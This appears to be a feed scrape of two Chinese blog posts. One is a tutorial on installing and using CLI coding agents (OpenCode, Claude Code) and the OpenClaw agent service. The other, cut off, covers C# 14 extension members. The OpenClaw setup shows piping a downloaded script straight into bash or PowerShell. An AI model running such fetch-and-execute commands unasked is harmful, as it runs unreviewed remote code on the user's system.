在实际工作中的使用方法时，首先需要回答的问题是“它运行在哪里、由谁控制、承担什么责任”。不同的运行形态，决定了它在工程系统中的角色边界。下面，让我们按照\"运行在哪里\"这个维度分三类来介绍 AI Agent 的使用方法，以及它们在这些应用场景中所承担的任务角色。</p>\n<h3 id=\"命令行工具型-agent\">命令行工具型 Agent</h3>\n<p>对于大多数开发者而言，以命令行工具的形式使用 AI Agent 是一种更符合工程直觉的方式。它运行在熟悉的终端环境中，可以直接访问文件系统与系统命令，因此看起来类似于自动化脚本。当然了，与传统脚本不同的是，AI Agent 的内部决策路径并非预先编写，而是由 LLM 在循环结构中动态生成。这类 AI Agent 应用的典型代表是 <a href=\"https://github.com/anthropics/claude-code\" rel=\"noopener nofollow\" target=\"_blank\">Claude Code</a>，目前同类的主流应用还包括 <a href=\"https://github.com/anomalyco/opencode\" rel=\"noopener nofollow\" target=\"_blank\">OpenCode</a>、<a href=\"https://github.com/openai/codex\" rel=\"noopener nofollow\" target=\"_blank\">Codex CLI</a>、<a href=\"https://github.com/google-gemini/gemini-cli\" rel=\"noopener nofollow\" target=\"_blank\">Gemini CLI</a>、<a href=\"https://github.com/iflow-ai/iflow-cli\" rel=\"noopener nofollow\" target=\"_blank\">iFlow CLI</a> 等。下面，我们首先要做的就是：先将这些工具安装到自己所在的操作系统中。</p>\n<h4 id=\"安装与配置\">安装与配置</h4>\n<p>命令行工具型 Agent 的安装方式其实是非常简单的。因为，虽然它们各自针对 MacOS/Linux/Windows 系统提供了不同的 bash/powershell 安装脚本，或者基于 homeberw/pacman/scoop 等针对不同操作系统平台的包管理器安装命令，但基本都提供了基于 NPM 这一包管理器的跨平台安装方式。所以，读者在大多数情况下都可以按照以下步骤来安装并使用这些工具：</p>\n<ol>\n<li>\n<p>确保自己所在的操作系统中已经安装了版本在 20.0.0 之上的 Node.js 运行环境，其中自带了 NPM 包管理器；</p>\n</li>\n<li>\n<p>在管理员权限下执行<code>npm install -g &lt;agent-name&gt;@&lt;version&gt;</code>命令，在这里，<code>&lt;agent-name&gt;</code>可以通过查询相关工具的官方网站来获得，而<code>&lt;version&gt;</code>则除了可以是我们在工具官网中查到的具体版本号之外，也可以用<code>latest</code>来表示最新版本。例如，如果我们需要安装最新版本的 OpenCode，就只需要在命令行终端中使用管理员权限执行<code>npm install -g opencode@latest</code>命令即可。</p>\n</li>\n</ol>\n<p>在安装完成之后，我们就可以用 CLI 和 TUI 两种方式来使用这种命令行工具型的 Agent 了。其中，TUI 的方式已经被大家所熟知，它实际上就是一个基于命令行界面的交互式程序，运作方式类似于 Python Shell 或 Node.js REPL，拥有属于自己的独立线程。例如在安装完 OpenCode 之后，我们只需要直接在命令行终端中输入<code>opencode</code>命令（如果想延续之前与 OpenCode 的会话，还在该命令后面加上一个<code>--continue</code>或<code>-c</code>参数），就可以启动它的 TUI 界面了，具体如图 1 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 1</strong>：OpenCode TUI 界面</p>\n<p>在初次进入上次界面时，我们可以对自己使用的 AI Agent 进行一些基本的配置，这些工具的配置方式基本上是大同小异的。一般来说，我们会先使用<code>/model</code>命令设置以下自己默认要使用的 LLM，例如您在图 2 中所看到的就是 OpenCode 的 LLM 选择界面：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 2</strong>：OpenCode LLM 选择界面</p>\n<p>通常情况下，在选择 LLM 之后，这些 AI Agent 会要求我们提供一个 API Key，用于在调用 LLM 时进行身份验证。这个 API key 可以通过登录我们在相应 LLM 官网的个人账户来获得。例如，我在这里选择使用的是智普的 GLM 模型，就需要登录到<a href=\"https://bigmodel.cn/\" rel=\"noopener nofollow\" target=\"_blank\">智普 AI 的官网</a>，并为 OpenCode 创建一个专属的 API Key，如图 3 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 3</strong>：创建智普 AI 的 API Key</p>\n<p>接下来，我们就只需要将上述 API Key 复制到 OpenCode 提示输入 key 的位置，并选择具体要使用的 GLM 版本并确认即可。完成这些配置之后，我们就可以通过一个 AI Agent 版的“Hello World”测试来确认它是否已经可以正常工作了，如图 4 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 4</strong>：OpenCode Hello World 测试</p>\n<p>如果 AI Agent 返回了类似上面这样的信息，就意味着我们已经可以开始使用它进行实际的工作了。除此之外，如果我们还想对 AI Agent 进行一些更复杂的配置，例如强制它只用中文来显示思考过程，以及回答的内容，也可以选择在自己的用户目录下为其创建一个全局的提示词文件。以 OpenCode 为例，其具体步骤如下：</p>\n<ol>\n<li>\n<p>根据自己所在的操作系统为 OpenCode 创建一个全局配置目录。在默认情况下，该目录的路径应该为<code>~/.config/opencode</code>，其中<code>~</code>表示我们的用户目录。</p>\n</li>\n<li>\n<p>在该目录下创建一个名为<code>AGENTS.md</code>的提示词文件，并在其中输入以下内容：</p>\n<pre><code class=\"language-markdown\"># Agent 配置\n\n## 语言设置\n- **默认语言**: 中文\n- **强制使用中文**: 是\n\n## 指令\n- 所有回答必须使用中文\n- 所有思考过程也显示中文\n- 除非用户明确要求使用其他语言提问，否则保持中文回答\n</code></pre>\n</li>\n</ol>\n<p>当然了，我们更多时候会希望上述提示词文件只针对当前项目有效，这可以进行更多个性化的配置。为此，我们也可以选择在该项目的根目录下打开 OpenCode TUI，然后在其中通过执行<code>/init</code>命令来创建一个针对当前项目的<code>AGENTS.md</code>文件，并将上述内容复制到该文件中即可，该命令的具体效果如图 5 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 5</strong>：OpenCode 的项目初始化命令</p>\n<p>至于其他 AI Agent，虽然会在全局配置目录与提示词文件上有各自的名称，但应用的工作流/机制基本是大同小异的，用户只需简单查询一下它们的官方文档，就可以轻松做到举一反三的，例如通过快速查询 Claude Code 的官方文档，立即就会知道它的全局提示词文件路径为<code>~/.claude/claude.md</code>。</p>\n<blockquote>\n<p>顺便说一句题外话，虽然 Claude Code 在各方面都为 AI Agent 应用建立了接近于标准的工作流/机制，但考虑到其官方的某些做法会给中文用户带来诸多没必要的额外配置，我在接下来还是会以 OpenCode 为例进行说明。如果读者想切实了解 Claude Code 的某些具体用法，也可参考本文在“参考资料”一节中提供的视频教程：《Claude Code 教程》。</p>\n</blockquote>\n<h4 id=\"基本操作方式\">基本操作方式</h4>\n<p>下面，让我们来具体介绍一下命令行工具型 Agent 的基本操作方式，正如之前所说，这类命令行工具通常有 CLI 和 TUI 两种使用方式，TUI 会单独打开一个工作线程来执行交互式操作，通常用于执行一些需要使用多轮提示词交互，并确认内容的复杂任务。因此，这些 Agent 应用的 TUI 往往至少会提供“计划（plan）”和“构建（build）”两个模式（个别 Agent 还会提供”自动（auto）“之类的第三种模式，或者在模式名称上存在差异，但其在基本使用逻辑上是一致的），其中，”计划“模式通常没有执行外部命令的权限，主要用于与 LLM 执行多轮交互，并确认某一杂任务的解决方案。例如在之前展示的 OpenCode TUI 中，读者可以在其输入框的下方看到，它默认处于“构建”模式。现在，我们可以通过输入<code>&lt;tab&gt;</code>键来将其切换到“计划”模式，然后再试着让它执行“使用 Python 编写并执行一个 hello world 程序”的操作，就会得到类似图 5 的输出：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 6</strong>：OpenCode 的计划模式</p>\n<p>正如读者所见，现在 OpenCode TUI 输入框下面提示其当前处于“计划”模式，并且告诉用户自己当前不能编辑文件和执行程序，然后开始与用户讨论任务的具体解决方案。而当我们切换到“构建”模式时，OpenCode 就会直接执行这个解决方案，并输出类似图 7 的结果：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 7</strong>：OpenCode 的构建模式</p>\n<p>当然了，就上面这种仅需一句简短的提示词就可以完成的任务而言，我们实际上更适合使用 CLI 的方式来执行。这种方式允许我们在 bash/powershell 这类命令行终端程序所在的当前线程中直接执行 AI Agent，并输出结果。例如，如果我们想使用 OpenCode CLI 的方式来编写并执行上面那个 Python 程序，可以直接在命令行终端中输入<code>opencode run \"使用 Python 编写并执行一个 hello world 程序\"</code>命令，并得到类似图 8 的输出：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 8</strong>：OpenCode 的 CLI 模式</p>\n<p>如读者所见，上述命令直接在 powershell 所在的当前线程中输出了 OpenCode 的执行结果。这样做的好处，除了避免因一些简单的任务反复启动和关闭 OpenCode TUI 之外，在必要情况下还可以使用 Shell/Python 这样的脚本语言来实现对 AI Agent 应用的批量调用，例如，如果我们想使用 Python 脚本批量调用 OpenCode CLI 来执行 5 个不同的任务，就可以像下面这样编写一个简单的 Python 脚本：</p>\n<pre><code class=\"language-python\">import subprocess\n\ntasks = [\n    \"使用 Python 编写并执行一个 hello world 程序\",\n    \"使用 Python 编写并执行一个计算斐波那契数列的程序\",\n    \"使用 Python 编写并执行一个计算阶乘的程序\",\n    \"使用 Python 编写并执行一个计算素数的程序\",\n    \"使用 Python 编写并执行一个计算回文数的程序\",\n]\n\nfor task in tasks:\n    try:\n        result = subprocess.run(\n            [\"opencode\", \"run\", task],\n            capture_output=True,\n            text=True,\n            check=True,\n            timeout=120\n        )\n        print(f\"任务成功: {task}\")\n        print(result.stdout)\n    except subprocess.CalledProcessError as e:\n        print(f\"任务失败: {task}\")\n        print(e.stderr)\n    except subprocess.TimeoutExpired:\n        print(f\"任务超时: {task}\")\n</code></pre>\n<p>除了<code>opencode run</code>命令之外，我们还可以通过执行<code>opencode -h</code>命令来查看其他可用 CLI 方式执行的 OpenCode 操作，如图 9 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 9</strong>：OpenCode 的 CLI 帮助信息</p>\n<p>虽然，上面这种多次调用<code>opencode run</code>命令的做法，在某些特定的情况下并不是最佳的任务编排方式。例如在某些时候，先将所有的需求写入一个 Markdown 文档中，再将其作为提示词一次性发给 AI Agent 可能会是一种更合适的做法。但是，我们可以基于这一思路发展出许多更复杂的 AI Agent 工作流，例如利用部署在服务端的 Agent 来操作这些命令行工具型的 Agent。下面，就让我们基于 OpenClaw 这一可部署服务型的 AI Agent 来了解一下这一工作流的具体实现方式。</p>\n<h3 id=\"可部署服务型-agent\">可部署服务型 Agent</h3>\n<p>如果我们将命令行工具型的 AI Agent 视为一种增强型的自动化工具，那么以 OpenClaw 为代表的、可在服务端部署的 AI Agent 则就是一种系统级执行单元，二者的差异主要在于运行形态与系统边界。具体来说就是，命令行工具型 Agent 的运行方式通常是：</p>\n<ul>\n<li>被用户触发</li>\n<li>执行一轮或多轮任务</li>\n<li>输出结果</li>\n<li>退出进程</li>\n</ul>\n<p>而可部署服务型 Agent 则具有以下完全不同的特征：</p>\n<ul>\n<li>常驻运行</li>\n<li>通过 HTTP / RPC / WebSocket 等方式对外提供能力</li>\n<li>持续维护会话状态</li>\n<li>支持多用户并发访问</li>\n<li>可以被其他系统调用</li>\n</ul>\n<p>在这种形态下，Agent 就不再是一个功能类似于自动化脚本的增强型工具了，它成为了常驻在操作系统中的一个服务组件。具体来说，如果从程序架构的角度来看，这两种 Agent 的差别主要体现在以下几个方面：</p>\n<ol>\n<li>\n<p>生命周期管理：命令行工具型 Agent 的生命周期通常是一次性的，执行完成即销毁，而可部署服务型 Agent 则具有长生命周期，需要考虑健康检查、日志管理、异常恢复机制。</p>\n</li>\n<li>\n<p>会话与状态管理：命令行工具型 Agent 的状态通常也是一次性的，而可部署服务型 Agent 则需要维护会话状态，这意味着它需要支持用户级会话隔离、长期上下文存储、记忆机制（Memory）以及外部数据库支持。</p>\n</li>\n<li>\n<p>多 Agent 编排能力：一旦 Agent 以系统服务组件的形式存在，它就可以调用其他 Agent，被其他 Agent 调用，参与更复杂的任务链。例如像这样：</p>\n<pre><code class=\"language-plaintext\">用户请求\n↓\n调度 Agent\n↓\n分析 Agent → 代码生成 Agent → 测试 Agent\n↓\n结果汇总\n</code></pre>\n<p>这种执行结构显然已经不再是单纯的工具调用，它关注的实际上已经是任务的编排与调度了。这也就意味着，我们需要在服务型的 Agent 中引入任务队列、消息队列、异步任务调度系统等机制。</p>\n</li>\n</ol>\n<p>下面，让我们以 OpenClaw 为例来具体介绍一下使用这种服务型 Agent 的一些基本工作流。假设，我们现在想使用 OpenClaw 指挥 OpenCode 来完成一个简单的网站重构任务，通常需要按照以下步骤来完成。</p>\n<h4 id=\"步骤-1安装并配置一个-openclaw-服务\">步骤 1：安装并配置一个 OpenClaw 服务</h4>\n<p>正如之前所说，OpenClaw 本质上是一个系统服务，这意味着免不了要赋予它较大的操作权限，基于安全方面的考虑，我个人不建议用户将其安装在自己日常的工作设备上。另外，如果想最大限度地发挥 OpenClaw 的功能，最好要能让它长时间持续运行，并执行一定程度的实际设备管理能力。因此，我们在安装 OpenClaw 时通常需要执行的操作如下：</p>\n<ul>\n<li>\n<p>配置好一台可与我们日常工作设备相连通的独立计算机（如果仅用于学习目的，也可以是一台虚拟机），并在其中安装好操作系统与 Node.js 22.x 以上版本的运行环境。</p>\n</li>\n<li>\n<p>在这台独立计算机上打开命令行终端，并执行<code>npm install -g openclaw@latest</code>命令来安装 OpenClaw。当然了，这是使用跨平台的方式。如果读者不想使用 NPM，也可以通过直接执行 bash/powershell 的安装脚本来完成这个操作，相关命令如下：</p>\n<pre><code class=\"language-bash\"># MacOS/Linux 系统下使用 bash 脚本安装：\ncurl -fsSL https://openclaw.ai/install.sh | bash\n# Windows 系统下使用 powershell 脚本安装：\niwr -useb https://openclaw.ai/install.ps1 | iex\n</code></pre>\n</li>\n<li>\n<p>待安装完成之后，继续执行<code>openclaw onboard --install-daemon</code>命令来启动新手安装向导（如图 10 所示），进一步安装 OpenClaw 的服务端组件（例如飞书机器人、WhatsApp 机器人等），关于这方面的内容，读者可参考本文在“参考资料”一节中提供的视频教程：《OpenClaw +飞书的工具流搭建过程》。</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 10</strong>：OpenClaw 的安装向导</p>\n</li>\n<li>\n<p>在配置完相关服务端组件之后，我们还需要通过执行如下命令来配置 OpenClaw 的 Gateway 网关：</p>\n<pre><code class=\"language-bash\">openclaw channels login\nopenclaw gateway --port 18789\n</code></pre>\n<p>在这里，<code>--port</code>参数用于指定 OpenClaw Gateway 的监听端口，如果读者希望使用默认的 18789 端口，则可以省略该参数。</p>\n</li>\n<li>\n<p>待 Gateway 启动之后，我们就可以使用浏览器打开<code>http://localhost:18789</code>来访问 OpenClaw 的 Web 端了，如果我们能看到如图 11 所示的界面，就说明 OpenClaw 已经成功安装并完成了初步的配置工作。</p>\n  \n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 11</strong>：OpenClaw 的 Web 端</p>\n</li>\n</ul>\n<h4 id=\"步骤-2配置-openclaw-调用-opencode-的方式\">步骤 2：配置 OpenClaw 调用 OpenCode 的方式</h4>\n<p>截止到目前为止，我们主要有<strong>两种方式</strong>可以让 OpenClaw 使用 OpenCode 来连接 LLM 并执行指定的任务。如果用户已购买了 OpenCode 的官方模型服务（即 OpenCode Zen），可以选择直接使用 OpenClaw 自带的 Zen 插件来调用 OpenCode，这种方式的具体操作如下：</p>\n<ul>\n<li>\n<p>先获取到 OpenCode Zen 的 API Key，然后通过执行如下命令之一，将其添加到 OpenClaw 的配置中：</p>\n<pre><code class=\"language-bash\"># 使用交互式命令，这需要根据该命令的提示输入你的 API Key\nopenclaw onboard --auth-choice opencode-zen\n# 或非交互式命令，直接将 API Key 作为参数传入\nopenclaw onboard --opencode-zen-api-key \"&lt;你的 API Key&gt;\"\n</code></pre>\n</li>\n<li>\n<p>如果需要的话，还可以通过执行如下命令来设置自己要使用的默认模型：</p>\n<pre><code class=\"language-bash\">openclaw config set agents.defaults.model.primary \"opencode/claude-opus-4-6\"\n</code></pre>\n</li>\n</ul>\n<p>当然了，选择上述方式需要用户不计较按量计费所带来的开销。如果我们想使用免费的 LLM 的话（譬如  kimi-k2.5-free），也可以通过给 OpenClaw 安装 <code>opencode-to-openai</code>这样的第三方插件来实现。这第二种方式的具体操作如下：</p>\n<ul>\n<li>\n<p>安装<code>opencode-to-openai</code>插件，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">git clone https://github.com/dxxzst/opencode-to-openai\ncd opencode-to-openai\nopenclaw plugins install .\n</code></pre>\n</li>\n<li>\n<p>安装完成后，需要执行如下命令来重启 OpenClaw，并确保插件已启用：</p>\n<pre><code class=\"language-bash\">openclaw gateway restart\n</code></pre>\n<p>在这里，如果我们在 OpenClaw 中启用了插件白名单，就还需要通过执行如下命令将该加入该白名单：</p>\n<pre><code class=\"language-bash\">openclaw config get plugins.allow --json\n# 假设返回 [\"a\",\"b\"]\n\nopenclaw config set plugins.allow '[\"a\",\"b\",\"opencode-to-openai\"]' --json\nopenclaw gateway restart\n</code></pre>\n</li>\n<li>\n<p>同步模型并认证 LLM 服务，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">openclaw models auth login --provider opencode-to-openai --method local\n</code></pre>\n<p>如果你想顺便设置默认模型：</p>\n<pre><code class=\"language-bash\">openclaw models auth login --provider opencode-to-openai --method local --set-default\n</code></pre>\n</li>\n<li>\n<p>选择模型，这需要通过执行如下命令来完成：</p>\n<pre><code class=\"language-bash\">openclaw models set opencode-to-openai/opencode/kimi-k2.5-free\n</code></pre>\n<p>在这里，如果担心对 LLM 的请求会被卡住，也可以用<code>useIsolatedHome=false</code>这个插件配置让 OpenCode 使用真实 HOME，具体配置命令如下：</p>\n<pre><code class=\"language-bash\">openclaw config set plugins.opencode-to-openai.useIsolatedHome false\n</code></pre>\n</li>\n</ul>\n<h4 id=\"步骤-3与-openclaw-进行对话\">步骤 3：与 OpenClaw 进行对话</h4>\n<p>如果上述操作一切顺利，我们就可以在步骤 1 中配置好的 Web 端或飞书之类的应用中打开与 OpenClaw 的对话窗口，通过发送提示词来调度 OpenCode 完成相关任务了，如图 12 所示：</p>\n\n<p><img alt=\"img\" class=\"lazyload\" /></p>\n<p><strong>图 12</strong>：与 OpenClaw 的对话窗口</p>\n<p>当然了，如果想让提示词发挥到最大的作用，并在生产环境中实际使用 OpenClaw/OpenCode 来完成具体的项目任务，我们还需要再配置一下 OpenClaw/OpenCode 所接入的 MCP 服务和 Agent Skills 机制了。关于这部分的内容，我将会在《[[Agent 的进阶应用]]》这一篇笔记中进行详细介绍。</p>\n<h2 id=\"结束语\">结束语</h2>\n<p>在完成了对 AI Agent 的学习与实践之后，我最为明显的体会之一是：Agent 并没有让系统变得更简单，反而让系统的边界变得更加清晰。与传统的自动化脚本或工具不同，Agent 并不是一组固定规则的集合，而是一个基于语言模型进行任务理解、规划与执行的系统组件。这意味着，在很多场景下，它所做的并不是“按预期运行”，而是“尽力完成任务”。</p>\n<p>正因如此，Agent 的引入并没有削弱人类在系统中的作用，反而对人的判断能力提出了更高要求：<br />\n我们需要能够理解 Agent 在做什么、为什么这么做，以及在什么情况下应该介入、修正甚至中止它的行为。从这个角度来看，学习和使用 AI Agent，并不意味着把控制权完全交给 AI，而是学会如何在一个由 AI 参与执行的系统中，重新定位人的职责与边界。这也正是本学习阶段的核心目标。</p>\n<h2 id=\"参考资料\">参考资料</h2>\n<ul>\n<li>\n<p>官方文档：</p>\n<ul>\n<li><a href=\"https://code.claude.com/docs/zh-CN/overview?utm_source=copilot.com\" rel=\"noopener nofollow\" target=\"_blank\">Claude Code 官方文档</a></li>\n<li><a href=\"https://opencode.doczh.com/docs/\" rel=\"noopener nofollow\" target=\"_blank\">OpenCode 官方文档</a></li>\n<li><a href=\"https://claude.com/blog/extending-claude-capabilities-with-skills-mcp-servers\" rel=\"noopener nofollow\" target=\"_blank\">基于 Agent skills 和 MCP 服务的协同工作流</a></li>\n<li><a href=\"https://docs.openclaw.ai/zh-CN\" rel=\"noopener nofollow\" target=\"_blank\">OpenClaw 官方文档</a></li>\n</ul>\n</li>\n<li>\n<p>视频教程：</p>\n<ul>\n<li>Claude Code 教程：<a href=\"https://www.youtube.com/watch?v=AT4b9kLtQCQ\" rel=\"noopener nofollow\" target=\"_blank\">YouTube 链接</a> / <a href=\"https://www.bilibili.com/video/BV14rzQB9EJj\" rel=\"noopener nofollow\" target=\"_blank\">Bilibili 链接</a></li>\n<li>OpenClaw +飞书的工具流搭建过程：<a href=\"https://www.youtube.com/watch?v=giv63OtX720\" rel=\"noopener nofollow\" target=\"_blank\">YouTube 链接</a> / <a href=\"https://www.bilibili.com/video/BV1rvcpzDEsH\" rel=\"noopener nofollow\" target=\"_blank\">Bilibili 链接</a></li>\n</ul>\n</li>\n</ul>\n\n\n</div>\n<div class=\"clear\"></div>\n\n        <p class=\"postfoot\">\n            posted on \n<span id=\"post-date\">2026-02-18 16:09</span>&nbsp;\n<a href=\"https://www.cnblogs.com/owlman\">凌杰</a>&nbsp;\n阅读(<span id=\"post_view_count\">91</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n        </p>"
    },
    {
      "title": ".NET 10 & C# 14 New Features 新增功能介绍-扩展成员Extension Members",
      "link": "https://www.cnblogs.com/tianqing/p/19622970",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianqing/p/19622970\" id=\"cb_post_title_url\" title=\"发布于 2026-02-18 11:20\">\n    <span>.NET 10 &amp; C# 14 New Features 新增功能介绍-扩展成员Extension Members</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p class=\"p1\"><span class=\"s1\">C# 14 引入了对扩展成员（Extension Members）的增强支持，本质上是对传统“扩展方法”模型的一次语言级升级，使其可以定义的不再仅限于方法，</span></p>\n<p class=\"p1\"><span class=\"s1\">而是可以扩展更多成员形态（例如属性、运算符等）。</span></p>\n<p class=\"p1\"><strong><span class=\"s1\" style=\"font-size: 16px;\">一、从扩展方法到扩展成员</span></strong></p>\n<p class=\"p1\">早在 <a><span class=\"s1\">C# 3.0</span></a> 中，就引入了“扩展方法（Extension Methods）”，其底层机制是：</p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">必须定义在 static class</span></p>\n</li>\n<li>\n<p class=\"p1\">方法必须是 <span class=\"s1\">static</span></p>\n</li>\n<li>\n<p class=\"p1\">第一个参数使用 <span class=\"s1\">this T</span></p>\n</li>\n</ul>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">class</span><span style=\"color: rgba(0, 0, 0, 1);\"> StringExtensions\n{\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">bool</span> IsNullOrEmptyEx(<span style=\"color: rgba(0, 0, 255, 1);\">this</span> <span style=\"color: rgba(0, 0, 255, 1);\">string</span><span style=\"color: rgba(0, 0, 0, 1);\"> value)\n        </span>=&gt; <span style=\"color: rgba(0, 0, 255, 1);\">string</span><span style=\"color: rgba(0, 0, 0, 1);\">.IsNullOrEmpty(value);\n}</span></pre>\n</div>\n<p>从本质上看：</p>\n<blockquote>编译器在语法层面做“糖化处理”，最终仍然是静态方法调用。</blockquote>\n<p><span class=\"s1\">LINQ就是最大的应用场景。</span></p>\n<p><strong><span class=\"s1\" style=\"font-size: 16px;\">二、C# 14中引入扩展成员和示例说明</span></strong></p>\n<p class=\"p1\">C# 14 允许在更自然的语法结构中声明扩展成员，不再局限于“静态类 + this 参数”模式，而是支持类似：</p>\n<div class=\"cnblogs_code\">\n<pre><span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> <span style=\"color: rgba(0, 0, 255, 1);\">class</span><span style=\"color: rgba(0, 0, 0, 1);\"> Enumerable\n{\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension block</span>\n    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> extension members for IEnumerable&lt;TSource&gt;</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension property:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">bool</span> IsEmpty =&gt; !<span style=\"color: rgba(0, 0, 0, 1);\">source.Any();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> Extension method:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, <span style=\"color: rgba(0, 0, 255, 1);\">bool</span>&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> predicate) { ... }\n    }\n\n    </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> extension block, with a receiver type only</span>\n    extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;) <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension members for IEnumerable&lt;Source&gt;</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    {\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension method:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; Combine(IEnumerable&lt;TSource&gt; first, IEnumerable&lt;TSource&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> second) { ... }\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static extension property:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; Identity =&gt; Enumerable.Empty&lt;TSource&gt;<span style=\"color: rgba(0, 0, 0, 1);\">();\n\n        </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> static user defined operator:</span>\n        <span style=\"color: rgba(0, 0, 255, 1);\">public</span> <span style=\"color: rgba(0, 0, 255, 1);\">static</span> IEnumerable&lt;TSource&gt; <span style=\"color: rgba(0, 0, 255, 1);\">operator</span> + (IEnumerable&lt;TSource&gt; left, IEnumerable&lt;TSource&gt; right) =&gt;<span style=\"color: rgba(0, 0, 0, 1);\"> left.Concat(right);\n    }\n}</span></pre>\n</div>\n<p class=\"p1\"><span class=\"s1\">定义的是一个 extension block<span class=\"s1\">，目标类型是：IEnumerable&lt;TSource&gt;</span></span></p>\n<p class=\"p1\">代码分成两类 extension block：　　</p>\n<ol start=\"1\">\n<li>\n<p class=\"p1\"><strong>实例扩展成员</strong></p>\n</li>\n<li>\n<p class=\"p1\"><strong>静态扩展成员</strong></p>\n</li>\n</ol>\n<p>① 实例扩展成员：extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)&nbsp;</p>\n<ul>\n<li>\n<p class=\"p1\"><span class=\"s1\">source 是接收者（receiver）</span></p>\n</li>\n<li>\n<p class=\"p1\"><span class=\"s1\">类似旧语法的 this IEnumerable&lt;TSource&gt; source</span></p>\n</li>\n<li>\n<p class=\"p1\">但语法更接近真正“为类型添加成员”</p>\n</li>\n</ul>\n<p>&nbsp;扩展属性：public bool IsEmpty =&gt; !source.Any();</p>\n<p class=\"p1\">&nbsp;编译器会生成：public static bool get_IsEmpty&lt;TSource&gt;(IEnumerable&lt;TSource&gt; source)</p>\n<p class=\"p1\">&nbsp;代码调用：list.IsEmpty</p>\n<p class=\"p1\">&nbsp;会被编译为：Enumerable.get_IsEmpty(list)</p>\n<p class=\"p1\">&nbsp;其本质仍然是：</p>\n<blockquote>静态方法 + 语法糖绑定</blockquote>\n<p class=\"p1\">但在语义层面：它已经不再是“工具方法”，而是“类型能力”。</p>\n<p class=\"p1\">扩展方法：public IEnumerable&lt;TSource&gt; Where(Func&lt;TSource, bool&gt; predicate)</p>\n<p class=\"p1\">即增强原有LINQ的Where功能</p>\n<p class=\"p1\"><span class=\"s1\">如果系统中已有 System.Linq.Enumerable.Where<span class=\"s1\">：</span></span></p>\n<ul>\n<li>\n<p class=\"p1\">实例成员优先</p>\n</li>\n<li>\n<p class=\"p1\">然后才是 extension block</p>\n</li>\n<li>\n<p class=\"p1\">再是 using 引入的扩展方法</p>\n</li>\n</ul>\n<p>&nbsp;不会破坏已有 API，只是参与候选集。</p>\n<p class=\"p1\">② 静态扩展成员</p>\n<p class=\"p1\">extension&lt;TSource&gt;(IEnumerable&lt;TSource&gt;)</p>\n<p class=\"p1\">这里没有 receiver 变量名。</p>\n<blockquote>为类型本身添加“静态扩展成员”</blockquote>\n<p class=\"p1\">找一个静态扩展方法</p>\n<p class=\"p1\">public static IEnumerable&lt;TSource&gt; Combine(...)</p>\n<p class=\"p1\">代码调用：IEnumerable&lt;int&gt;.Combine(a, b);</p>\n<p class=\"p1\">编译器会转化为：Enumerable.Combine(a, b);</p>\n<p class=\"p1\">再看一个静态扩展属性</p>\n<p 